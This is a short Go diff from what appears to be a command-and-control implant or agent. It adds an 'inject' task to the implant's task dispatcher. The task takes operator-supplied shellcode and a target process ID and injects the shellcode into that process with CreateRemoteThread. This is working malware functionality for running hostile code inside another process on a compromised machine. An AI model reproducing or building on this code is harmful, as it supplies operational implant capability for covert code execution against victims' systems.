@@ -334,10 +334,24 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 			}()
 
 			data = fmt.Sprintf("successfully injected into process %s", pid)
-		case "tokens":
-			if taskData == "list" {
+		case "inject":
+			taskDataSplit := strings.Split(taskData, " -- ")
+			shellcode := []byte(taskDataSplit[0])
+			pid := taskDataSplit[1]
 
+			iPid, err := strconv.Atoi(pid)
+			if err != nil {
+				data = err.Error()
+				break
 			}
+
+			err = hg.CreateRemoteThread(shellcode, iPid)
+			if err != nil {
+				data = err.Error()
+				break
+			}
+
+			data = "successfully injected into process"
 		default:
 			data = "command not supported"
 		}
